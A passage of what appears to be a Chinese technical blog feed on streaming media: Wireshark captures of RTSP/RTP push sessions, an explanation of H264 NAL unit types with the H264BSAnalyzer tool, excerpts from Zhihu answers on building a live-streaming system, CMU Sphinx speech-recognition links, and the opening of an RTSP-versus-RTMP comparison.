RTP/AVP/TCP;interleaved=0-1;mode=record</span><br><span class="line"></span><br><span class="line">SETUP rtsp://192.168.0.223:554/test//trackID=1 RTSP/1.0</span><br><span class="line"><span class="attribute">Transport</span>: RTP/AVP/TCP;interleaved=2-3;mode=record</span><br><span class="line"><span class="attribute">CSeq</span>: 4</span><br><span class="line"><span class="attribute">Session</span>: 0sSc8K7Mg</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line"><span class="attribute">CSeq</span>: 4</span><br><span class="line"><span class="attribute">Session</span>: 0sSc8K7Mg</span><br><span class="line"><span class="attribute">Transport</span>: RTP/AVP/TCP;interleaved=2-3;mode=record</span><br><span class="line"></span><br><span class="line">RECORD rtsp://192.168.0.223:554/test/ RTSP/1.0</span><br><span class="line"><span class="attribute">Range</span>: npt=0.000-</span><br><span class="line"><span class="attribute">CSeq</span>: 5</span><br><span class="line"><span class="attribute">Session</span>: 0sSc8K7Mg</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line"><span class="attribute">CSeq</span>: 5</span><br><span class="line"><span class="attribute">Session</span>: 0sSc8K7Mg</span><br></pre></td></tr></table></figure>
<p>rtp over tcp</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">RTSP Interleaved Frame, Channel: 0x00, 284 bytes</span><br><span class="line">    Magic: 0x24</span><br><span class="line">    Channel: 0x00</span><br><span class="line">    Length: 284</span><br><span class="line">Real-Time Transport Protocol</span><br><span class="line">    10.. .... = Version: RFC 1889 Version (2)</span><br><span class="line">    ..0. .... = Padding: False</span><br><span class="line">    ...0 .... = Extension: False</span><br><span class="line">    .... 0000 = Contributing source identifiers count: 0</span><br><span class="line">    1... .... = Marker: True</span><br><span class="line">    Payload type: DynamicRTP-Type-96 (96)</span><br><span class="line">    Sequence number: 1</span><br><span class="line">    Timestamp: 31752</span><br><span class="line">    Synchronization Source identifier: 0x4ead93aa (1319998378)</span><br><span class="line">    Payload: 00100860211c0fd3f7b904100cd41d9a87d188f484100ea0…</span><br><span class="line">RTSP Interleaved Frame, Channel: 0x01, 28 bytes</span><br><span class="line">    Magic: 0x24</span><br><span class="line">    Channel: 0x01</span><br><span class="line">    Length: 28</span><br><span class="line">Real-time Transport Control Protocol (Sender Report)</span><br><span class="line">    10.. .... = Version: RFC 1889 Version (2)</span><br><span class="line">    ..0. .... = Padding: False</span><br><span class="line">    ...0 0000 = Reception report count: 0</span><br><span class="line">    Packet type: Sender Report (200)</span><br><span class="line">    Length: 6 (28 bytes)</span><br><span class="line">    Sender SSRC: 0x1335186a (322246762)</span><br><span class="line">    Timestamp, MSW: 29536 (0x00007360)</span><br><span class="line">    Timestamp, LSW: 3497974249 (0xd07ed9e9)</span><br><span class="line">    [MSW and LSW as NTP timestamp: Feb  7, 2036 14:40:32.814435595 UTC]</span><br><span class="line">    RTP timestamp: 992265000</span><br><span class="line">    Sender's packet count: 1</span><br><span class="line">    Sender's octet count: 284</span><br><span class="line">    [RTCP frame length check: OK - 28 bytes]</span><br><span class="line">RTSP Interleaved Frame, Channel: 0x00, 288 bytes</span><br><span class="line">    Magic: 0x24</span><br><span class="line">    Channel: 0x00</span><br><span class="line">    Length: 288</span><br><span class="line">Real-Time Transport Protocol</span><br><span class="line">    10.. .... = Version: RFC 1889 Version (2)</span><br><span class="line">    ..0. .... = Padding: False</span><br><span class="line">    ...0 .... = Extension: False</span><br><span class="line">    .... 0000 = Contributing source identifiers count: 0</span><br><span class="line">    1... .... = Marker: True</span><br><span class="line">    Payload type: DynamicRTP-Type-96 (96)</span><br><span class="line">    Sequence number: 2</span><br><span class="line">    Timestamp: 33004</span><br><span class="line">    Synchronization Source identifier: 0x4ead93aa (1319998378)</span><br><span class="line">    Payload: 00100880211c0feb7e2005013ccc4515a510e8443a710e88…</span><br><span class="line">RTSP Interleaved Frame, Channel: 0x00, 297 bytes</span><br><span class="line">    Magic: 0x24</span><br><span class="line">    Channel: 0x00</span><br><span class="line">    Length: 297</span><br><span class="line">Real-Time Transport Protocol</span><br><span class="line">    10.. .... = Version: RFC 1889 Version (2)</span><br><span class="line">    ..0. .... = Padding: False</span><br><span class="line">    ...0 .... = Extension: False</span><br><span class="line">    .... 0000 = Contributing source identifiers count: 0</span><br><span class="line">    1... .... = Marker: True</span><br><span class="line">    Payload type: DynamicRTP-Type-96 (96)</span><br><span class="line">    Sequence number: 3</span><br><span class="line">    Timestamp: 33515</span><br><span class="line">    Synchronization Source identifier: 0x4ead93aa (1319998378)</span><br><span class="line">    Payload: 001008c8211c09bffe4800621cd41d928bd10874c22d1907…</span><br><span class="line">RTSP Interleaved Frame, Channel: 0x00, 248 bytes</span><br><span class="line">    Magic: 0x24</span><br><span class="line">    Channel: 0x00</span><br><span class="line">    Length: 248</span><br><span class="line">Real-Time Transport Protocol</span><br><span class="line">    10.. .... = Version: RFC 1889 Version (2)</span><br><span class="line">    ..0. .... = Padding: False</span><br><span class="line">    ...0 .... = Extension: False</span><br><span class="line">    .... 0000 = Contributing source identifiers count: 0</span><br><span class="line">    1... .... = Marker: True</span><br><span class="line">    Payload type: DynamicRTP-Type-96 (96)</span><br><span class="line">    Sequence number: 4</span><br><span class="line">    Timestamp: 34804</span><br><span class="line">    Synchronization Source identifier: 0x4ead93aa (1319998378)</span><br><span class="line">    Payload: 00100740211c0f6d4c8000fffcdb348a29d108f462802b9d…</span><br><span class="line">RTSP Interleaved Frame, Channel: 0x00, 257 bytes</span><br><span class="line">    Magic: 0x24</span><br><span class="line">    Channel: 0x00</span><br><span class="line">    Length: 257</span><br><span class="line">Real-Time Transport Protocol</span><br><span class="line">    10.. .... = Version: RFC 1889 Version (2)</span><br><span class="line">    ..0. .... = Padding: False</span><br><span class="line">    ...0 .... = Extension: False</span><br><span class="line">    .... 0000 = Contributing source identifiers count: 0</span><br><span class="line">    1... .... = Marker: True</span><br><span class="line">    Payload type: DynamicRTP-Type-96 (96)</span><br><span class="line">    Sequence number: 5</span><br><span class="line">    Timestamp: 36157</span><br><span class="line">    Synchronization Source identifier: 0x4ead93aa (1319998378)</span><br><span class="line">    Payload: 00100788211c0fa51e28016f3cdb30dfa316019b72bf3373…</span><br></pre></td></tr></table></figure>
<h3 id="六、Record-抓包-Over-UDP"><a href="#六、Record-抓包-Over-UDP" class="headerlink" title="六、Record 抓包 Over UDP"></a>六、Record 抓包 Over UDP</h3><ul>
<li>推流client端 <code>rtmp-rtsp-stream-client-java</code> 选用UDP推流 （ <strong>这里用Wireshark抓包</strong> ）</li>
<li>server端EasyDarwin</li>
</ul>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">OPTIONS rtsp://192.168.0.223:554/test/ RTSP/1.0</span><br><span class="line"><span class="attribute">CSeq</span>: 1</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line"><span class="attribute">CSeq</span>: 1</span><br><span class="line"><span class="attribute">Session</span>: 6KgD6pnGg</span><br><span class="line"><span class="attribute">Public</span>: DESCRIBE, SETUP, TEARDOWN, PLAY, PAUSE, OPTIONS, ANNOUNCE, RECORD</span><br><span class="line"></span><br><span class="line">ANNOUNCE rtsp://192.168.0.223:554/test/ RTSP/1.0</span><br><span class="line"><span class="attribute">CSeq</span>: 2</span><br><span class="line"><span class="attribute">Content-Length</span>: 444</span><br><span class="line"><span class="attribute">Content-Type</span>: application/sdp</span><br><span class="line"></span><br><span class="line">v=0</span><br><span class="line">o=- 0 0 IN IP4 127.0.0.1</span><br><span class="line">s=Unnamed</span><br><span class="line">i=N/A</span><br><span class="line">c=IN IP4 192.168.0.223</span><br><span class="line">t=0 0</span><br><span class="line">a=recvonly</span><br><span class="line">m=video 0 RTP/AVP 96</span><br><span class="line">a=rtpmap:96 H264/90000</span><br><span class="line">a=fmtp:96 packetization-mode=1;sprop-parameter-sets=Z0LAKNoBEA8WXgHhAIVA,aM48gA==;</span><br><span class="line">a=control:trackID=1</span><br><span class="line">m=audio 0 RTP/AVP 96</span><br><span class="line">a=rtpmap:96 MPEG4-GENERIC/44100/2</span><br><span class="line">a=fmtp:96 streamtype=5; profile-level-id=15; mode=AAC-hbr; config=1210; SizeLength=13; IndexLength=3; IndexDeltaLength=3;</span><br><span class="line">a=control:trackID=0</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line"><span class="attribute">CSeq</span>: 2</span><br><span class="line"><span class="attribute">Session</span>: 6KgD6pnGg</span><br><span class="line"></span><br><span class="line">SETUP rtsp://192.168.0.223:554/test//trackID=0 RTSP/1.0</span><br><span class="line"><span class="attribute">Transport</span>: RTP/AVP/UDP;unicast;client_port=5000-5001;mode=record</span><br><span class="line"><span class="attribute">CSeq</span>: 3</span><br><span class="line"><span class="attribute">Session</span>: 6KgD6pnGg</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line"><span class="attribute">CSeq</span>: 3</span><br><span class="line"><span class="attribute">Session</span>: 6KgD6pnGg</span><br><span class="line"><span class="attribute">Transport</span>: RTP/AVP/UDP;unicast;client_port=5000-5001;server_port=53646-50516;mode=record</span><br><span class="line"></span><br><span class="line">SETUP rtsp://192.168.0.223:554/test//trackID=1 RTSP/1.0</span><br><span class="line"><span class="attribute">Transport</span>: RTP/AVP/UDP;unicast;client_port=5002-5003;mode=record</span><br><span class="line"><span class="attribute">CSeq</span>: 4</span><br><span class="line"><span class="attribute">Session</span>: 6KgD6pnGg</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line"><span class="attribute">Session</span>: 6KgD6pnGg</span><br><span class="line"><span class="attribute">Transport</span>: RTP/AVP/UDP;unicast;client_port=5002-5003;server_port=50593-32937;mode=record</span><br><span class="line"><span class="attribute">CSeq</span>: 4</span><br><span class="line"></span><br><span class="line">RECORD rtsp://192.168.0.223:554/test/ RTSP/1.0</span><br><span class="line"><span class="attribute">Range</span>: npt=0.000-</span><br><span class="line"><span class="attribute">CSeq</span>: 5</span><br><span class="line"><span class="attribute">Session</span>: 6KgD6pnGg</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line"><span class="attribute">CSeq</span>: 5</span><br><span class="line"><span class="attribute">Session</span>: 6KgD6pnGg</span><br><span class="line"></span><br><span class="line">TEARDOWN rtsp://192.168.0.223:554/test/ RTSP/1.0</span><br><span class="line"><span class="attribute">CSeq</span>: 6</span><br><span class="line"><span class="attribute">Session</span>: 6KgD6pnGg</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line"><span class="attribute">CSeq</span>: 6</span><br><span class="line"><span class="attribute">Session</span>: 6KgD6pnGg</span><br></pre></td></tr></table></figure>
<p>rtp over udp</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">User Datagram Protocol, Src Port: 62235, Dst Port: 50593</span><br><span class="line">Real-Time Transport Protocol</span><br><span class="line">    10.. .... = Version: RFC 1889 Version (2)</span><br><span class="line">    ..0. .... = Padding: False</span><br><span class="line">    ...0 .... = Extension: False</span><br><span class="line">    .... 0000 = Contributing source identifiers count: 0</span><br><span class="line">    0... .... = Marker: False</span><br><span class="line">    Payload type: DynamicRTP-Type-96 (96)</span><br><span class="line">    Sequence number: 2</span><br><span class="line">    Timestamp: 254255</span><br><span class="line">    Synchronization Source identifier: 0x401fd7b1 (1075828657)</span><br><span class="line">    Payload: 7c85b82057ffffc2e2450001014fd63fde278f9369f7bbe4…</span><br></pre></td></tr></table></figure>
<h3 id="七、Record-抓包-Over-UDP-FFmpeg"><a href="#七、Record-抓包-Over-UDP-FFmpeg" class="headerlink" title="七、Record 抓包 Over UDP (FFmpeg)"></a>七、Record 抓包 Over UDP (FFmpeg)</h3><ul>
<li>推流FFmpeg(<code>ffmpeg -re -i move.mp4 -vcodec copy -codec copy -f rtsp rtsp://192.168.0.30/live</code>)</li>
<li>server端 基于Netty写的接收程序（ <strong>这里用Wireshark抓包</strong> ）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OPTIONS rtsp://192.168.0.30:554/live RTSP/1.0</span><br><span class="line">CSeq: 1</span><br><span class="line">User-Agent: Lavf57.71.100</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">public: OPTIONS, ANNOUNCE, SETUP, RECORD, TEARDOWN</span><br><span class="line">cseq: 1</span><br><span class="line">SESSION: 850601d9</span><br><span class="line">connection: keep-alive</span><br><span class="line"></span><br><span class="line">ANNOUNCE rtsp://192.168.0.30:554/live RTSP/1.0</span><br><span class="line">Content-Type: application/sdp</span><br><span class="line">CSeq: 2</span><br><span class="line">User-Agent: Lavf57.71.100</span><br><span class="line">Session: 850601d9</span><br><span class="line">Content-Length: 494</span><br><span class="line"></span><br><span class="line">v=0</span><br><span class="line">o=- 0 0 IN IP4 127.0.0.1</span><br><span class="line">s=No Name</span><br><span class="line">c=IN IP4 192.168.0.30</span><br><span class="line">t=0 0</span><br><span class="line">a=tool:libavformat 57.71.100</span><br><span class="line">m=video 0 RTP/AVP 96</span><br><span class="line">b=AS:1351</span><br><span class="line">a=rtpmap:96 H264/90000</span><br><span class="line">a=fmtp:96 packetization-mode=1; sprop-parameter-sets=Z2QAIKzZgIgee+EAAAMD6QAB1MAPGDGa,aOl4ssiw; profile-level-id=640020</span><br><span class="line">a=control:streamid=0</span><br><span class="line">m=audio 0 RTP/AVP 97</span><br><span class="line">b=AS:128</span><br><span class="line">a=rtpmap:97 MPEG4-GENERIC/44100/2</span><br><span class="line">a=fmtp:97 profile-level-id=1;mode=AAC-hbr;sizelength=13;indexlength=3;indexdeltalength=3; config=1210</span><br><span class="line">a=control:streamid=1</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">cseq: 2</span><br><span class="line">SESSION: 850601d9</span><br><span class="line">connection: keep-alive</span><br><span class="line"></span><br><span class="line">SETUP rtsp://192.168.0.30:554/live/streamid=0 RTSP/1.0</span><br><span class="line">Transport: RTP/AVP/UDP;unicast;client_port=20502-20503;mode=record</span><br><span class="line">CSeq: 3</span><br><span class="line">User-Agent: Lavf57.71.100</span><br><span class="line">Session: 850601d9</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">transport: RTP/AVP/UDP;unicast;client_port=20502-20503;mode=record;server_port=54000-54001;ssrc=1015232941</span><br><span class="line">cseq: 3</span><br><span class="line">SESSION: 850601d9</span><br><span class="line">connection: keep-alive</span><br><span class="line"></span><br><span class="line">SETUP rtsp://192.168.0.30:554/live/streamid=1 RTSP/1.0</span><br><span class="line">Transport: RTP/AVP/UDP;unicast;client_port=20504-20505;mode=record</span><br><span class="line">CSeq: 4</span><br><span class="line">User-Agent: Lavf57.71.100</span><br><span class="line">Session: 850601d9</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">transport: RTP/AVP/UDP;unicast;client_port=20504-20505;mode=record;server_port=54000-54001;ssrc=102410565</span><br><span class="line">cseq: 4</span><br><span class="line">SESSION: 850601d9</span><br><span class="line">connection: keep-alive</span><br><span class="line"></span><br><span class="line">RECORD rtsp://192.168.0.30:554/live RTSP/1.0</span><br><span class="line">Range: npt=0.000-</span><br><span class="line">CSeq: 5</span><br><span class="line">User-Agent: Lavf57.71.100</span><br><span class="line">Session: 850601d9</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">filename: 1595477112</span><br><span class="line">cseq: 5</span><br><span class="line">SESSION: 850601d9</span><br><span class="line">connection: keep-alive</span><br><span class="line"></span><br><span class="line">TEARDOWN rtsp://192.168.0.30:554/live RTSP/1.0</span><br><span class="line">CSeq: 6</span><br><span class="line">User-Agent: Lavf57.71.100</span><br><span class="line">Session: 850601d9</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>音视频</category>
      </categories>
  </entry>
  <entry>
    <title>开源的H264数据包分析软件H264BSAnalyzer</title>
    <url>/%E9%9F%B3%E8%A7%86%E9%A2%91/%E5%BC%80%E6%BA%90%E7%9A%84H264%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90%E8%BD%AF%E4%BB%B6H264BSAnalyzer/</url>
    <content><![CDATA[<p><a href="https://github.com/latelee/H264BSAnalyzer" target="_blank" rel="noopener">https://github.com/latelee/H264BSAnalyzer</a> 是一个Win程序，用于分享H264文件，已有打包好exe的文件。</p>
<p>打开一个H264文件，如图<br><img src="/images/音视频/h264文件分析.png" alt></p>
<p>可以看到这个软件已经把每一个Nal解析为一行一行的，H264文件就是以Nal为单位。</p>
<p>一个H264文件，开头的是SPS和PPS，SEI可有可无，然后就是I帧，再就P帧或者B帧。</p>
<p>每一帧都会有一个start code，H264BSAnalyzer 是将  <code>00 00 00 01</code> + <code>FNRIType（第一个字节）</code> 作为 start code 。</p>
<blockquote>
<p><code>00 00 00 01</code> 也可以看做是一个分隔符，<code>00 00 01</code> 也是合法的</p>
</blockquote>
<p>FNRIType的二进制表示意义：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// +---------------+</span><br><span class="line">// |0|1|2|3|4|5|6|7|</span><br><span class="line">// +-+-+-+-+-+-+-+-+</span><br><span class="line">// |F|NRI| Type    |</span><br><span class="line">// +---------------+</span><br></pre></td></tr></table></figure></p>
<p>F 占1bit，是禁止位，它的值一定是0，非0就说明这个Nal是错误的<br>NRI 占2bit，它的取值范围在0~3，值越大，表示这个Nal越重要<br>Type 占5bit，表示Nal的类型nal_type。</p>
<p>常见的FNRIType字节值有：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">67：SPS</span><br><span class="line">68：PPS</span><br><span class="line">65：I帧</span><br><span class="line">41：非I帧</span><br><span class="line">61：非I帧</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>通过这个字节可以简单的判断帧类型，但严谨的作法是： 读取这个字节的低位5个bit，转为十进制，这才是真正的类型值 nal_type。<br>以  0x67 作为例：</p>
<ol>
<li>0x67的二进制是 0x01100111</li>
<li>取5个bit高位补零 就是 0x00000111 （ &amp;0x1F ）</li>
<li>十进制是7。</li>
<li>查表找到SPS</li>
</ol>
<table>
<thead>
<tr>
<th>值</th>
<th>NAL类型</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>未使用</td>
</tr>
<tr>
<td>1</td>
<td>非IDR的片</td>
</tr>
<tr>
<td>2</td>
<td>片数据A分区</td>
</tr>
<tr>
<td>3</td>
<td>片数据B分区</td>
</tr>
<tr>
<td>4</td>
<td>片数据C分区</td>
</tr>
<tr>
<td>5</td>
<td>一个序列的第一个图像叫做 IDR 图像（立即刷新图像），IDR 图像都是 I 帧</td>
</tr>
<tr>
<td>6</td>
<td>补充增强信息单元（SEI）</td>
</tr>
<tr>
<td>7</td>
<td>序列参数集(SPS)</td>
</tr>
<tr>
<td>8</td>
<td>图像参数集(PPS)</td>
</tr>
<tr>
<td>9</td>
<td>分界符</td>
</tr>
<tr>
<td>10</td>
<td>序列结束</td>
</tr>
<tr>
<td>11</td>
<td>码流结束</td>
</tr>
<tr>
<td>12</td>
<td>填充</td>
</tr>
<tr>
<td>13…23</td>
<td>保留</td>
</tr>
<tr>
<td>24…31</td>
<td>未使用</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>音视频</category>
      </categories>
  </entry>
  <entry>
    <title>搭建一个完整的视频直播系统</title>
    <url>/%E9%9F%B3%E8%A7%86%E9%A2%91/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%AE%8C%E6%95%B4%E7%9A%84%E8%A7%86%E9%A2%91%E7%9B%B4%E6%92%AD%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<p>本文是对知乎的问答进行感兴趣知识提取，内容太多，以下是不完全提取，阅读原文 <a href="https://www.zhihu.com/question/42162310/answers/created" target="_blank" rel="noopener">传送门</a></p>
<h3 id="直播Android主播端解决方案"><a href="#直播Android主播端解决方案" class="headerlink" title="直播Android主播端解决方案"></a>直播Android主播端解决方案</h3><p><a href="https://github.com/beautifulSoup/RtmpRecoder" target="_blank" rel="noopener">github</a></p>
<p>他推流用的是 <a href="https://github.com/bytedeco/javacv" target="_blank" rel="noopener">JavaCV 库</a> ，JavaCV 是一款开源的视觉处理库，基于GPLv2协议，对各种常用计算机视觉库封装后的一组jar包，其中就有ffmpeg，可以直接拿来作为推流用。</p>
<blockquote>
<p><a href="http://www.tangokk.com/blog/2016/01/29/%E7%9B%B4%E6%92%AD%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88-%E6%90%AD%E5%BB%BA%E4%BD%A0%E8%87%AA%E5%B7%B1%E7%9A%84%E7%9B%B4%E6%92%AD%E5%B9%B3%E5%8F%B0/" target="_blank" rel="noopener">视频直播解决方案</a><br><a href="http://www.tangokk.com/blog/2016/01/29/%E7%9B%B4%E6%92%AD%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88-%E6%90%AD%E5%BB%BA%E4%BD%A0%E8%87%AA%E5%B7%B1%E7%9A%84%E7%9B%B4%E6%92%AD%E5%B9%B3%E5%8F%B0/" target="_blank" rel="noopener">Android使用FFMpeg实现推送视频直播流到服务器</a><br><a href="http://www.tangokk.com/blog/2016/01/30/%E5%9C%A8%E5%90%84%E7%AB%AF%E5%AE%9E%E7%8E%B0Rtmp%E5%92%8Chls%E6%B5%81%E8%A7%86%E9%A2%91%E7%9A%84%E6%92%AD%E6%94%BE/" target="_blank" rel="noopener">如何在网页端和移动端播放Rtmp和hls视频流</a></p>
</blockquote>
<h3 id="小白龙"><a href="#小白龙" class="headerlink" title="小白龙"></a>小白龙</h3><blockquote>
<p><a href="https://github.com/DyncLang/DevLiveBook" target="_blank" rel="noopener">励志成为较全的直播技术导航_AnyRTC</a></p>
</blockquote>
<h4 id="Jackie-L"><a href="#Jackie-L" class="headerlink" title="Jackie L"></a>Jackie L</h4><blockquote>
<p>视频采集：直播视频采集是比较难解决的技术，主流的是IOS和安卓，IOS比较好适配些，是人都知道，国外有款免费的Live:Air Solo 的APP，建议直接拿来使用好些，安卓是非常麻烦的平台，由于安卓本身碎片化的原因，最让程序员头疼的就是解决安卓适配的问题，如果要做安卓端的，建议要好好下功夫；其次是PC端，PC端可以分为网页上发起直播和客户端 上发起直播，网页上发起直播比较方便些，开发的技术也不难，但是其稳定性不好，不是很建议使用。客户端的话开发难度就相对更大些， 国内很多厂商的客户端都是基于一款叫做OBS(OpenBroadcaster Software)的直播客户端来做的，建议直接拿来使用，这样可以控制成本。</p>
</blockquote>
<h4 id="何李石"><a href="#何李石" class="headerlink" title="何李石"></a>何李石</h4><blockquote>
<ol>
<li>采集<br>采集是播放环节中的第一环，iOS 系统因为软硬件种类不多，硬件适配性较好，所以比较简单。Android 则不同，市面上硬件机型非常多，难以做到一个库适配所有硬件。PC 端的采集也跟各种摄像头驱动有关，推荐使用目前市面上最好用的 PC 端开源免费软件 OBS: <a href="https://obsproject.com/" target="_blank" rel="noopener">https://obsproject.com/</a><br>参考教程：斗鱼游戏直播教程-OBS直播软件篇<a href="http://www.douyu.com/cms/zhibo/201311/13/250.shtml" target="_blank" rel="noopener">推荐</a><br><a href="https://github.com/ossrs/srs/wiki/v3_CN_Home" target="_blank" rel="noopener">v3_CN_Home</a></li>
<li>解码和渲染<br>解码和渲染，也即音视频的播放，目前 iOS 端的播放兼容性较好，在延迟可接受的情况下使用 HLS 协议是最好的选择。Android 的硬件解码和编码一样也存在兼容性问题，目前比较好的开源播放器是基于 ffplay 的 ijkplayer：<a href="https://link.zhihu.com/?target=https%3A//github.com/Bilibili/ijkplayer" target="_blank" rel="noopener">https://link.zhihu.com/?target=https%3A//github.com/Bilibili/ijkplayer</a><br>目前，我们七牛在客户端采集、编码解码以及推流拉流加速方面做了很多工作，以上干货也是基于这个过程中踩过的坑整理出来的：<a href="https://link.zhihu.com/?target=https%3A//github.com/pili-engineering" target="_blank" rel="noopener">https://link.zhihu.com/?target=https%3A//github.com/pili-engineering</a></li>
</ol>
</blockquote>
<h4 id="黄家浩-–专注云计算，专注视频技术"><a href="#黄家浩-–专注云计算，专注视频技术" class="headerlink" title="黄家浩 –专注云计算，专注视频技术"></a>黄家浩 –专注云计算，专注视频技术</h4><blockquote>
<p> 现在很多的直播toc平台类似映客、花椒、六间房、他们都有主播，伴随这主播的肯定有美颜和特技的一些功能，tob类平台也比较多，展视互动，保利威视，微赞，微吼，腾讯要是自己搭建一套直播系统的话，我建议考虑以下几个因素<br> 1.采集<br> 采集是播放环节中的第一环，iOS 系统比较简单，软硬件适配性较好。Android系统市面上的开源系统非常多，所以很难可以找一个库可以匹配所有的系统。PC 端的采集也跟各种摄像头驱动有关，推荐使用目前市面上最好用的 PC 端开源免费软件 OBS。<br> 2.编码<br> 编码主要难点有两个：1. 处理硬件兼容性问题。2. 在高 fps、低 bitrate 和音质画质之间找到平衡，fps一般建议选择15fps，600K码率。iOS 端硬件兼容性较好。而 Android 的的支持系统比较多，推荐使用软编。<br> 3.推流和传输（CDN）<br> 传输涉及到很多端：从主播端到服务端，从推流服务端到边缘节点，以及再从边缘节点到观众端。推流端和分发端理论上需要支持的并发用户数应该都是千万级的，不过毕竟产生内容的推流端在少数，和消费内容端播放端不是一个量级，但是他们对推流稳定性和速度的要求比播放端高很多，这涉及到所有播放端能否看到直播，以及直播端质量如何。感觉现在的独家CDN太不靠谱，要多家冗余，互相弥补才行。<br> 4.转码<br> 为了让主播推上来的流适配各个平台端各种不同协议，需要在服务端做一些流处理工作，比如转码成不同格式支持不同协议如 RTMP、HLS 和 FLV，一路转多路流来适配各种不同的网络状况和不同分辨率的终端设备。<br> 5.解码（播放）<br> 解码，也即音视频的播放，目前 iOS 端的播放兼容性较好，在延迟可接受的情况下使用 HLS 协议。Android 的硬件解码和编码一样也存在兼容性问题，目前比较好的开源播放器是基于 ffplay 的 ijkplayer，同样也是使用HLS协议。PC端目前国内最好的还是flash，播放的是FLV，h5的直播播放器还在研究当中吧。<br> 直播涉及到音视频，从推流到拉流，需要解决各种兼容性问题，如果技术没有强大的技术团队的话，对于这块硬骨头确实是比较难啃，建议您可以看看现在目前比较好的直播平台，各家也可以对比一下，以稳定，流畅，延时的几个角度出发。<br> 编辑于 2017-08-21</p>
</blockquote>
]]></content>
      <categories>
        <category>音视频</category>
      </categories>
  </entry>
  <entry>
    <title>语音识别CMU-Sphinx资料</title>
    <url>/%E9%9F%B3%E8%A7%86%E9%A2%91/%E8%AF%AD%E9%9F%B3%E8%AF%86%E5%88%ABCMU-Sphinx%E8%B5%84%E6%96%99/</url>
    <content><![CDATA[<ul>
<li><p><a href="http://www.dataguru.cn/article-11656-1.html" target="_blank" rel="noopener">2017-6-27 11:33 横向对比5大开源语音识别工具包，CMU Sphinx最佳 </a></p>
</li>
<li><p><a href="http://www.cnblogs.com/yin52133/archive/2012/07/12/2588201.html" target="_blank" rel="noopener">2012-07-12 Sphinx语音识别学习记录 （四）-小范围语音中文识别</a></p>
</li>
<li><p><a href="http://zuoshu.iteye.com/blog/1463867" target="_blank" rel="noopener">Android平台使用PocketSphinx做离线语音识别，小范围语音99%识别率</a></p>
</li>
<li><p><a href="http://www.cnblogs.com/huanghuang/archive/2011/07/14/2106579.html" target="_blank" rel="noopener">Sphinx武林秘籍(上)使用现有的语言模型与声学模型(C语言)</a></p>
</li>
<li><p><a href="https://github.com/cmusphinx" target="_blank" rel="noopener">cmusphinx</a></p>
</li>
<li><p><a href="https://github.com/cmusphinx/sphinx4" target="_blank" rel="noopener">sphinx4(Java实现的cmusphinx)</a></p>
</li>
<li><p><a href="https://github.com/cmusphinx/pocketsphinx-android-demo" target="_blank" rel="noopener">pocketsphinx-android-demo</a></p>
</li>
</ul>
<p>…</p>
]]></content>
      <categories>
        <category>音视频</category>
      </categories>
  </entry>
  <entry>
    <title>音视频推流协议RTSP和RTMP</title>
    <url>/%E9%9F%B3%E8%A7%86%E9%A2%91/%E9%9F%B3%E8%A7%86%E9%A2%91%E6%8E%A8%E6%B5%81%E5%8D%8F%E8%AE%AERTSP%E5%92%8CRTMP/</url>
    <content><![CDATA[<p>这是两种常用的音视频推流协议，这里简单比较一下两种协议应用场景（本文适合Java、Android开发者）。</p>
<p>参考：</p>
<ul>
<li><a href="https://www.jianshu.com/p/c04d810b7562" target="_blank" rel="noopener">【视频传输协议详解（RTMP、RTSP、HLS）】</a></li>
<li><a href="https://blog.csdn.net/wujian946110509/category_9288271.html" target="_blank" rel="noopener">【流媒体 RTSP/RTP/RTCP/RTMP H264】</a></li>
<li><a href="https://blog.csdn.net/weixin_42462202/category_9293806.html" target="_blank" rel="noopener">【从零开始写一个RTSP服务器】</a></li>
</ul>
<h2 id="一、RTMP"><a href="#一、RTMP" class="headerlink" title="一、RTMP"></a>一、RTMP</h2><p>Real Time Messaging Protocol（实时消息传输协议）是 Adobe 的私有协议，设计用来进行实时数据通信的网络协议，主要用来在Flash/AIR平台和支持RTMP协议的流媒体/交互服务器之间进行音视频和数据通信。</p>
<p>基本架构：<code>采集端rtmp-client</code>-&gt; <code>web服务器rtmp-server</code> -&gt; <code>播放端rtmp-client</code><br>特点：</p>
<h4 id="RTMP特性"><a href="#RTMP特性" class="headerlink" title="RTMP特性"></a>RTMP特性</h4><ol>
<li>延迟较大</li>
<li>传输效率相对较低</li>
<li>底层采用TCP,网络环境较差下，采用RTMP保证了视频的传输质量</li>
<li>浏览器支持</li>
<li>一般需要一个流服务器中转</li>
</ol>
<p>应用场景</p>
<ol>
<li>网络直播（如斗鱼等平台）</li>
</ol>
